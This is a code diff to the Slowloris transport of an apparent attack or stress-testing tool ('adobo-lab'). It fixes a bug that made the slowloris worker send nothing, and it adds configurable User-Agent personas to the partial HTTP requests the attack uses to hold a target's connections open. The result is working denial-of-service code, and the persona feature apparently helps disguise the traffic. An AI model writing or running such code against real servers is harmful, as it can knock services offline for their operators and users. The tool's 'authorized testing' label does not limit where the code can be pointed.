@@ -10,7 +10,7 @@ import socket
 import time
 from typing import ClassVar
 
-from ..models import ProfileName, Target, TransportKind
+from ..models import AttackProfile, ProfileName, Target, TransportKind
 from .base import Transport, TransportError, build_payload
 
 __all__ = ["SlowlorisTransport"]
@@ -50,12 +50,22 @@ class SlowlorisTransport(Transport):
         self._count_error()
         raise TransportError("Slowloris uses worker loop, not send_one")
 
-    def worker_loop(self, worker_id: int, per_worker_pps: float) -> None:
+    def worker_loop(
+        self, worker_id: int, per_worker_pps: float, attack: AttackProfile | None = None
+    ) -> None:
         """Hold HTTP connections open, dribbling headers at them.
 
         Concurrency is derived from the rate: ten partial requests per second
         is the point of the attack, so one held connection is treated as ten
         packets per second of budget.
+
+        *attack* is accepted because the engine calls every self-paced transport
+        the same way - ``worker_loop(index, per_worker_pps, attack)`` - and this
+        signature used to omit it. That made slowloris the one profile whose
+        worker raised ``TypeError`` on entry, which the engine's own handler
+        recorded as a worker error: the profile reported failures and sent
+        nothing. Optional rather than required so an existing two-argument caller
+        keeps working.
 
         Every wait goes through ``self._stop.wait`` rather than
         ``time.sleep``. A bare sleep is uninterruptible, so the loop would sit
@@ -69,6 +79,17 @@ class SlowlorisTransport(Transport):
         # Per-worker budget, so N workers hold N times this many connections.
         concurrent_connections = max(1, int(per_worker_pps) // 10)
 
+        # Resolved once, not per connection: the persona is a property of the
+        # transport's identity, and slowloris holds a fixed pool of sockets
+        # rather than recycling one. A rotation seed keyed on the connection
+        # count would be constant here anyway, so it is resolved without one and
+        # the first configured persona is used for the whole pool.
+        persona = attack.persona() if attack is not None else None
+        user_agent = (
+            persona.user_agent if persona is not None
+            else "adobo-lab/0.1 (authorized testing)"
+        )
+
         while not self._stop.is_set():
             # Maintain target number of connections
             while len(self._sockets) < concurrent_connections and not self._stop.is_set():
@@ -78,12 +99,18 @@ class SlowlorisTransport(Transport):
                     sock.settimeout(5.0)
                     sock.connect((target_host, target_port))
                     self._sockets.append(sock)
+                    self.connections_opened += 1
 
-                    # Send initial partial request
+                    # Send initial partial request.
+                    #
+                    # The truncation is the attack: an unfinished request holds
+                    # the connection open. It must stay unfinished, so the
+                    # persona contributes only its User-Agent and the header
+                    # block is still cut mid-line.
                     request = (
                         f"GET /?{hash((worker_id, time.time()))} HTTP/1.1\r\n"
                         f"Host: {target_host}\r\n"
-                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+                        f"User-Agent: {user_agent}\r\n"
                         f"Accept: */*\r\n"
                         f"Connection: keep-alive\r\n"
                         f"X-Custom-"
